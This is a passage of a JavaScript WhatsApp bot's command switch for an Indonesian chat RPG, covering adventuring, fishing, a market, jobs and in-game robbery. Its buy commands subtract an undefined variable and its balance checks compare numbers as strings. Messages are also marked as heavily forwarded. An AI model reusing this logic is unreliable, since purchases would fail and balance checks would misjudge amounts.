					await sock.sendMessage(m.chat, {
						text: `Kamu bertemu dengan ${obje}`,
						edit: key
					});
					await sleep(5000)
					await sock.sendMessage(m.chat, {
						text: `Menjelajah...`,
						edit: key
					});
					await sleep(3000)
					let adv = "";
					adv += "-「 *ADVENTURE* 」-\n\n";
					adv += `*📍 ${text}*\n`;
					adv += `- Kayu: ${kayu}\n`;
					adv += `- Besi: ${besi}\n`;
					adv += `- Rank: ${rank}\n`;
					adv += `- Uang: Rp ${saldo}\n\n`;
					adv += "*Stamina berkurang -20*\n";
					await sock.sendMessage(m.chat, {
						text: adv,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "RPG - ADVENTURE",
								body: 'Adventure exploring the world',
								thumbnailUrl: thumbadv,
								sourceUrl: "tes",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
					db.data.rpg[m.sender].kayu += kayu
					db.data.rpg[m.sender].besi += besi
					db.data.rpg[m.sender].rank += rank
					db.data.rpg[m.sender].uang += saldo
				} else if (tuju === "tropical forest") {
					db.data.rpg[m.sender].darahuser -= 20
					let thumbadv = "https://telegra.ph/file/bbc4d8eb053479d69e5f7.jpg"
					let {
						key
					} = await sock.sendMessage(m.chat, {
						text: 'Berpetualang, Mohon Tunggu...'
					}, {
						quoted: m
					})
					await sleep(3000)
					await sock.sendMessage(m.chat, {
						text: `Kamu bertemu dengan ${obje}`,
						edit: key
					});
					await sleep(5000)
					await sock.sendMessage(m.chat, {
						text: `Menjelajah...`,
						edit: key
					});
					await sleep(3000)
					let adv = "";
					adv += "-「 *ADVENTURE* 」-\n\n";
					adv += `*📍 ${text}*\n`;
					adv += `- Kayu: ${kayu}\n`;
					adv += `- Besi: ${besi}\n`;
					adv += `- Rank: ${rank}\n`;
					adv += `- Uang: Rp ${saldo}\n\n`;
					adv += "*Stamina berkurang -20*\n";
					await sock.sendMessage(m.chat, {
						text: adv,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "RPG - ADVENTURE",
								body: 'Adventure exploring the world',
								thumbnailUrl: thumbadv,
								sourceUrl: "tes",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
					db.data.rpg[m.sender].kayu += kayu
					db.data.rpg[m.sender].besi += besi
					db.data.rpg[m.sender].rank += rank
					db.data.rpg[m.sender].uang += saldo
				} else {
					let thumbadv = "https://telegra.ph/file/6b9482a4ed6bd79c7a03e.jpg"
					let adv = "";
					adv += "-「 *ADVENTURE* 」-\n\n";
					adv += "*Pilih Lokasi Jelajahmu📍*\n";
					adv += "- savanah\n";
					adv += "- dessert\n";
					adv += "- boreal forest\n";
					adv += "- tropical forest\n\n";
					adv += "*Contoh:*\n";
					adv += ".adventure savanah\n";
					await sock.sendMessage(m.chat, {
						text: adv,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "RPG - ADVENTURE",
								body: 'Adventure exploring the world',
								thumbnailUrl: thumbadv,
								sourceUrl: "tes",
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				}
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'memancing':
			case 'mancing': {
				if (!db.data.users[m.sender].rpg) return newReply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				if (db.data.rpg[m.sender].darahuser < 1) return newReply('Kamu Lemah, Silahkan Sembuhkan Menggunakan Ramuan/Makanan\n\nKetik _.heal_')
				let ikan = await randomNomor(0, 20)
				db.data.rpg[m.sender].ikan += ikan
				db.data.rpg[m.sender].darahuser -= 20
				let thum = ["https://telegra.ph/file/9b1f618a826fe7b3bed3e.jpg", "https://telegra.ph/file/2e772e9732c88e153e812.jpg", "https://telegra.ph/file/872b36a0dd7b6843f24da.jpg", "https://telegra.ph/file/562adf3d43cde4d355e76.jpg", "https://telegra.ph/file/7d641d46e96e9aace01dd.jpg"]
				let thumn = await pickRandom(thum)
				let {
					key
				} = await sock.sendMessage(m.chat, {
					text: 'Sedang Memancing...'
				}, {
					quoted: m
				})
				await sleep(5000)
				await sock.sendMessage(m.chat, {
					text: `Memperoleh Hasil...`,
					edit: key
				});
				await sleep(5000)
				let txt = "";
				txt += "「 *MEMANCING* 」\n\n";
				txt += `Berhasil mendapatkan ${ikan} ikan\n\n`;
				txt += "_Stamina berkurang -20_\n";
				sock.sendMessage(m.chat, {
					text: txt,
					contextInfo: {
						mentionedJid: [m.sender],
						forwardingScore: 9999,
						isForwarded: true,
						forwardedNewsletterMessageInfo: {
							newsletterJid: saluran,
							serverMessageId: null,
							newsletterName: saluranName
						},
						externalAdReply: {
							title: "RPG - FISHING",
							body: 'Looking for fish catch',
							thumbnailUrl: thumn,
							sourceUrl: "tes",
							mediaType: 1,
							renderLargerThumbnail: true
						}
					}
				}, {
					quoted: m
				})
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'sell':
			case 'jual': {
				if (!db.data.users[m.sender].rpg) return newReply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				let jual = args[0]
				switch (jual) {
					case 'emas': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 2500)
						let jumlh = Number(args[1])
						if (`${db.data.rpg[m.sender].emas}` < `${jumlh}`) return newReply(`*Emas Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang += uang
						db.data.rpg[m.sender].emas -= parseInt(args[1])

					}
					break
					case 'besi': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 1500)
						let jumlh = Number(args[1])
						if (`${db.data.rpg[m.sender].besi}` < `${jumlh}`) return newReply(`*Besi Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang += uang
						db.data.rpg[m.sender].besi -= parseInt(args[1])
						let message = "";
						message += "*MARKET - JUAL🛍️*\n\n";
						message += "*Item Terjual:*\n";
						message += `- Emas: ${args[1]}\n\n`;
						message += "*Penghasilan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'batubara': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 1000)
						let jumlh = Number(args[1])
						if (`${db.data.rpg[m.sender].batubara}` < `${jumlh}`) return newReply(`*Batu Bara Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang += uang
						db.data.rpg[m.sender].batubara -= parseInt(args[1])
						let message = "";
						message += "*MARKET - JUAL🛍️*\n\n";
						message += "*Item Terjual:*\n";
						message += `- Batu Bara: ${args[1]}\n\n`;
						message += "*Penghasilan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'perak': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 2000)
						let jumlh = Number(args[1])
						if (`${db.data.rpg[m.sender].perak}` < `${jumlh}`) return newReply(`*Perak Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang += uang
						db.data.rpg[m.sender].perak -= parseInt(args[1])
						let message = "";
						message += "*MARKET - JUAL🛍️*\n\n";
						message += "*Item Terjual:*\n";
						message += `- Perak: ${args[1]}\n\n`;
						message += "*Penghasilan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'kayu': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 500)
						let jumlh = Number(args[1])
						if (`${db.data.rpg[m.sender].kayu}` < `${jumlh}`) return newReply(`*Kayu Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang += uang
						db.data.rpg[m.sender].kayu -= parseInt(args[1])
						let message = "";
						message += "*MARKET - JUAL🛍️*\n\n";
						message += "*Item Terjual:*\n";
						message += `- Kayu: ${args[1]}\n\n`;
						message += "*Penghasilan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'ayam': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 500)
						let jumlh = Number(args[1])
						if (`${db.data.rpg[m.sender].ayam}` < `${jumlh}`) return newReply(`*Ayam Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang += uang
						db.data.rpg[m.sender].ayam -= parseInt(args[1])
						let message = "";
						message += "*MARKET - JUAL🛍️*\n\n";
						message += "*Item Terjual:*\n";
						message += `- Ayam: ${args[1]}\n\n`;
						message += "*Penghasilan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'sapi': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 3000)
						let jumlh = Number(args[1])
						if (`${db.data.rpg[m.sender].sapi}` < `${jumlh}`) return newReply(`*Sapi Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang += uang
						db.data.rpg[m.sender].sapi -= parseInt(args[1])
						let message = "";
						message += "*MARKET - JUAL🛍️*\n\n";
						message += "*Item Terjual:*\n";
						message += `- Sapi: ${args[1]}\n\n`;
						message += "*Penghasilan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'domba': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 2000)
						let jumlh = Number(args[1])
						if (`${db.data.rpg[m.sender].domba}` < `${jumlh}`) return newReply(`*Domba Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang += uang
						db.data.rpg[m.sender].domba -= parseInt(args[1])
						let message = "";
						message += "*MARKET - JUAL🛍️*\n\n";
						message += "*Item Terjual:*\n";
						message += `- Domba: ${args[1]}\n\n`;
						message += "*Penghasilan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'ikan': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 200)
						let jumlh = Number(args[1])
						if (`${db.data.rpg[m.sender].ikan}` < `${jumlh}`) return newReply(`*Ikan Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang += uang
						db.data.rpg[m.sender].ikan -= parseInt(args[1])
						let message = "";
						message += "*MARKET - JUAL🛍️*\n\n";
						message += "*Item Terjual:*\n";
						message += `- Ikan: ${args[1]}\n\n`;
						message += "*Penghasilan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					default:
					let teks = "";
					teks += "「	*🛍️ MARKET 🛍️*	」\n\n";
					teks += "*Pilih Barang Yang*\n";
					teks += "*Akan Di Jual*\n";
					teks += "- emas\n";
					teks += "- besi\n";
					teks += "- batubara\n";
					teks += "- perak\n";
					teks += "- kayu\n";
					teks += "- ayam\n";
					teks += "- sapi\n";
					teks += "- domba\n";
					teks += "- ikan\n\n";
					teks += "*Contoh:*\n";
					teks += `${prefix + command} ikan\n`;
					sock.sendMessage(m.chat, {
						text: teks,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "SELLING MARKET",
								body: 'Sell goods to earn money',
								thumbnailUrl: "https://telegra.ph/file/df72d0f6cc35b7581594b.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					}, {
						quoted: m
					})
				}
			}
			break

			case 'belanja':
			case 'beli': {
				if (!db.data.users[m.sender].rpg) return newReply(`*Join RPG Terlebih Dahulu*\n\nketik _.joinrpg_`)
				let beli = args[0]
				switch (beli) {
					case 'emas': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 2500)
						if (`${db.data.users[m.sender].uang}` < `${uang}`) return newReply(`*Uang Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang -= duid
						db.data.rpg[m.sender].emas += parseInt(args[1])
						let message = "";
						message += "*MARKET - BELI🛍️*\n\n";
						message += "*Item Dibeli:*\n";
						message += `- Emas: ${args[1]}\n\n`;
						message += "*Dibayarkan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'besi': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 1500)
						if (`${db.data.users[m.sender].uang}` < `${uang}`) return newReply(`*Uang Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang -= duid
						db.data.rpg[m.sender].besi += parseInt(args[1])
						let message = "";
						message += "*MARKET - BELI🛍️*\n\n";
						message += "*Item Dibeli:*\n";
						message += `- Besi: ${args[1]}\n\n`;
						message += "*Dibayarkan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'batubara': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 1000)
						if (`${db.data.users[m.sender].uang}` < `${uang}`) return newReply(`*Uang Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang -= duid
						db.data.rpg[m.sender].batubara += parseInt(args[1])
						let message = "";
						message += "*MARKET - BELI🛍️*\n\n";
						message += "*Item Dibeli:*\n";
						message += `- Batu Bara: ${args[1]}\n\n`;
						message += "*Dibayarkan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'perak': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 2000)
						if (`${db.data.users[m.sender].uang}` < `${uang}`) return newReply(`*Uang Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang -= duid
						db.data.rpg[m.sender].perak += parseInt(args[1])
						let message = "";
						message += "*MARKET - BELI🛍️*\n\n";
						message += "*Item Dibeli:*\n";
						message += `- Perak: ${args[1]}\n\n`;
						message += "*Dibayarkan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'kayu': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 500)
						if (`${db.data.users[m.sender].uang}` < `${uang}`) return newReply(`*Uang Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang -= duid
						db.data.rpg[m.sender].kayu += parseInt(args[1])
						let message = "";
						message += "*MARKET - BELI🛍️*\n\n";
						message += "*Item Dibeli:*\n";
						message += `- Kayu: ${args[1]}\n\n`;
						message += "*Dibayarkan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'ayam': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 500)
						if (`${db.data.users[m.sender].uang}` < `${uang}`) return newReply(`*Uang Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang -= duid
						db.data.rpg[m.sender].ayam += parseInt(args[1])
						let message = "";
						message += "*MARKET - BELI🛍️*\n\n";
						message += "*Item Dibeli:*\n";
						message += `- Kayu: ${args[1]}\n\n`;
						message += "*Dibayarkan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'sapi': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 3000)
						if (`${db.data.users[m.sender].uang}` < `${uang}`) return newReply(`*Uang Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang -= duid
						db.data.rpg[m.sender].sapi += parseInt(args[1])
						let message = "";
						message += "*MARKET - BELI🛍️*\n\n";
						message += "*Item Dibeli:*\n";
						message += `- Sapi: ${args[1]}\n\n`;
						message += "*Dibayarkan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'domba': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 2000)
						if (`${db.data.users[m.sender].uang}` < `${uang}`) return newReply(`*Uang Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang -= duid
						db.data.rpg[m.sender].domba += parseInt(args[1])
						let message = "";
						message += "*MARKET - BELI🛍️*\n\n";
						message += "*Item Dibeli:*\n";
						message += `- Domba: ${args[1]}\n\n`;
						message += "*Dibayarkan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					case 'ikan': {
						if (!args[1]) return newReply(`*Masukan Jumlahnya*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						if (isNaN(args[1])) return newReply(`*Jumlah Harus Berupa Angka*\n\nContoh:\n${prefix + command} ${args[0]} 2`)
						let uang = Number(parseInt(args[1]) * 200)
						if (`${db.data.users[m.sender].uang}` < `${uang}`) return newReply(`*Uang Kamu Tidak Cukup*`)
						db.data.users[m.sender].uang -= duid
						db.data.rpg[m.sender].ikan += parseInt(args[1])
						let message = "";
						message += "*MARKET - BELI🛍️*\n\n";
						message += "*Item Dibeli:*\n";
						message += `- Ikan: ${args[1]}\n\n`;
						message += "*Dibayarkan:*\n";
						message += `- Saldo: ${uang}\n\n`;
						message += "*Sisa Uang:*\n";
						message += `- Saldo Total: ${db.data.users[m.sender].uang}\n`;

						newReply(message);
					}
					break
					default:
					let teks = "";
					teks += "「	*🛍️ MARKET 🛍️*	」\n\n";
					teks += "*Pilih Barang Yang*\n";
					teks += "*Akan Di Beli*\n";
					teks += "- emas\n";
					teks += "- besi\n";
					teks += "- batubara\n";
					teks += "- perak\n";
					teks += "- kayu\n";
					teks += "- ayam\n";
					teks += "- sapi\n";
					teks += "- domba\n";
					teks += "- ikan\n\n";
					teks += "*Contoh:*\n";
					teks += `${prefix + command} ikan\n`;
					sock.sendMessage(m.chat, {
						text: teks,
						contextInfo: {
							mentionedJid: [m.sender],
							forwardingScore: 9999,
							isForwarded: true,
							forwardedNewsletterMessageInfo: {
								newsletterJid: saluran,
								serverMessageId: null,
								newsletterName: saluranName
							},
							externalAdReply: {
								title: "BUY AN ITEM",
								body: 'Buy the necessary items',
								thumbnailUrl: "https://telegra.ph/file/df72d0f6cc35b7581594b.jpg",
								sourceUrl: wagc,
								mediaType: 1,
								renderLargerThumbnail: true
							}
						}
					})
				}
			}
			break

			case 'bekerja':
			case 'kerja': {
				let type = (args[0] || '').toLowerCase()
				let time = db.data.rpg[m.sender].lastkerja + 600000
				let __timers = (new Date - db.data.rpg[m.sender].lastkerja)
				let _timers = (0 - __timers)
				let timers = clockString(_timers)
				let penumpan = ['mas mas', 'bapak bapak', 'cewe sma', 'bocil epep', 'emak emak']
				let penumpang = await pickRandom(penumpan)
				let daganga = ['wortel', 'sawi', 'selada', 'tomat', 'seledri', 'cabai', 'daging', 'ikan', 'ayam']
				let dagangan = await pickRandom(daganga)
				let pasie = ['sakit kepala', 'cedera', 'luka bakar', 'patah tulang']
				let pasien = await pickRandom(pasie)
				let pane = ['Wortel', 'Kubis', 'stowbery', 'teh', 'padi', 'jeruk', 'pisang', 'semangka', 'durian', 'rambutan']
				let panen = await pickRandom(pane)
				let bengke = ['mobil', 'motor', 'becak', 'bajai', 'bus', 'angkot', 'becak', 'sepeda']
				let bengkel = await pickRandom(bengke)
				let ruma = ['Membangun Rumah', 'Membangun Gedung', 'Memperbaiki Rumah', 'Memperbaiki Gedung', 'Membangun Fasilitas Umum', 'Memperbaiki Fasilitas Umum']
				let rumah = await pickRandom(ruma)

				switch (type) {
					case 'ojek':
						if (new Date - db.data.rpg[m.sender].lastkerja < 600000) return newReply(`Kamu sudah bekerja\nSaatnya istirahat selama ${clockString(time - new Date())}`)
						let hasilojek = Math.floor(Math.random() * 10000)
						newReply(`Kamu Sudah Mengantarkan *${penumpang}* 🚗\nDan mendapatkan uang senilai *Rp ${hasilojek} 💰*`).then(() => {
							db.data.users[m.sender].uang += hasilojek
							db.data.rpg[m.sender].lastkerja = new Date * 1
						})
					break

					case 'pedagang':
						if (new Date - db.data.rpg[m.sender].lastkerja < 600000) return newReply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
						let hasildagang = Math.floor(Math.random() * 10000)
						newReply(`Ada pembeli yg membeli *${dagangan}* 🛒\nDan mendapatkan uang senilai *Rp ${hasildagang} 💰*`).then(() => {
							db.data.users[m.sender].uang += hasildagang
							db.data.rpg[m.sender].lastkerja = new Date * 1
						})
					break

					case 'dokter':
						if (new Date - db.data.rpg[m.sender].lastkerja < 600000) return newReply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
						let hasildokter = Math.floor(Math.random() * 10000)
						newReply(`Kamu menyembuhkan pasien *${pasien}* 💉\nDan mendapatkan uang senilai *Rp ${hasildokter}* 💰`).then(() => {
							db.data.users[m.sender].uang += hasildokter
							db.data.rpg[m.sender].lastkerja = new Date * 1
						})
					break

					case 'petani':
						if (new Date - db.data.rpg[m.sender].lastkerja < 600000) return newReply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
						let hasiltani = Math.floor(Math.random() * 10000)
						newReply(`${panen} Sudah Panen !🌽 Dan menjualnya 🧺\nDan mendapatkan uang senilai Rp *${hasiltani} 💰*`).then(() => {
							db.data.users[m.sender].uang += hasiltani
							db.data.rpg[m.sender].lastkerja = new Date * 1
						})
					break

					case 'montir':
						if (new Date - db.data.rpg[m.sender].lastkerja < 600000) return newReply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
						let hasilmontir = Math.floor(Math.random() * 10000)
						newReply(`Kamu Baru saja mendapatkan pelanggan dan memperbaiki *${bengkel} 🔧*\nDan Kamu mendapatkan uang senilai *Rp ${hasilmontir}* 💰`).then(() => {
							db.data.users[m.sender].uang += hasilmontir
							db.data.rpg[m.sender].lastkerja = new Date * 1
						})
					break

					case 'kuli':
						if (new Date - db.data.rpg[m.sender].lastkerja < 600000) return newReply(`Kamu sudah bekerja\nSaatnya istirahat selama\n🕜 ${clockString(time - new Date())}`)
						let hasilkuli = Math.floor(Math.random() * 10000)
						newReply(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${hasilkuli} 💰*`).then(() => {
							db.data.users[m.sender].uang += hasilkuli
							db.data.rpg[m.sender].lastkerja = new Date * 1
						})
					break
					default:
						let teks = "";
						teks += "*💼 RPG - KERJA 💼*\n\n";
						teks += "*Select your job*:\n";
						teks += "- montir\n";
						teks += "- kuli\n";
						teks += "- petani\n";
						teks += "- dokter\n";
						teks += "- pedagang\n";
						teks += "- ojek\n\n";
						teks += "*Contoh*:\n";
						teks += `${prefix + command} kuli\n`;
						sock.sendMessage(m.chat, {
							text: teks,
							contextInfo: {
								mentionedJid: [m.sender],
								forwardingScore: 9999,
								isForwarded: true,
								forwardedNewsletterMessageInfo: {
									newsletterJid: saluran,
									serverMessageId: null,
									newsletterName: saluranName
								},
								externalAdReply: {
									title: "RPG - JOB SIMULATOR",
									body: 'Choose a job and enjoy the results',
									thumbnailUrl: "https://pomf2.lain.la/f/x1pvc1mq.jpg",
									sourceUrl: "tes",
									mediaType: 1,
									renderLargerThumbnail: true
								}
							}
						}, {
							quoted: m
						})
				}
			}
			break

			case 'merampok':
			case 'rampok': {
				let hasil = (Math.floor(Math.random() * 50000))
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (!m.mentionedJid[0] && !m.quoted && !text) return newReply(`*Tag/Reply Target!*\n\nContoh :\n${prefix + command} @0`)
				if (users == m.sender) return newReply("Gak bisa ngerampok diri sendiri goblok 😑")
				let __timers = (new Date - db.data.rpg[m.sender].lastrampok)
				let _timers = (3600000 - __timers)
				let timers = clockString(_timers)
				if (new Date - db.data.rpg[m.sender].lastrampok > 3600000) {
					if (db.data.users[users].uang < 50000) return newReply("Target kismin cokk🙀")
					db.data.users[users].uang -= hasil * 1
					db.data.users[m.sender].uang += hasil * 1
					db.data.rpg[m.sender].lastrampok = new Date * 1
					newReply(`😈Target Berhasil Dirampok Dan Mendapatkan Rp ${hasil}`)
				} else newReply(`Loe udah ngerampok ngabb😑\ntunggu ${timers} untuk merampok lagi`)
			}
			break

			case 'redeem': {
				db.redeem = db.redeem || {
					isRedeem: false,
					code: "",
					user: [],
					maxRedeem: 0
				}
				if (!db.redeem.isRedeem) return newReply("*Gak ada redeem yang di berikan 😓*")
				if (!text) return newReply("*Masukin kodenya wak!*")
				if (db.redeem.isRedeem) {
					let code = text.toLowerCase()
					let redeem = db.redeem.code.toLowerCase()
					if (code !== redeem) return newReply("*Kode Kamu gak valid!*")
